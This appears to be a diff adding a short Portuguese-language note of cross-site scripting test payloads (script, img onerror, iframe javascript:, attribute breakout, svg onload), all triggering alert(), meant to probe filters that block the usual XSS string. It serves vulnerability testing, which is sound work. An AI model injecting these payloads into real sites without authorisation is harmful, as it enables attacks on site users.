@@ -1,0 +1,14 @@
+ALGUMAS EMPRESAR BLOQUEAM O CÓDIGO MAIS COMUM DO XSS, ENTÃO PODE SE USAR MAIS FORMAS PARA TESTAR SE A VULNERABILIDADE É EXISTENTE.
+	
+	CÓDIGOS:
+		<script>alert('oi')</script>
+		
+		<img src=x onerror=alert('oi')>
+		
+		<iframe src="javascript:alert('xss')">
+		
+		"> <img src=x onerror=alert('xss')>
+		
+		<svg onload=alert('xss')>
+		
+OBS: PESQUISANDO POR 'CHEAT SHEET XSS' VOCÊ ENCONTRA DIVERSOS CÓDIGOS PARA TESTE DE VULNERABILIDADE XSS.
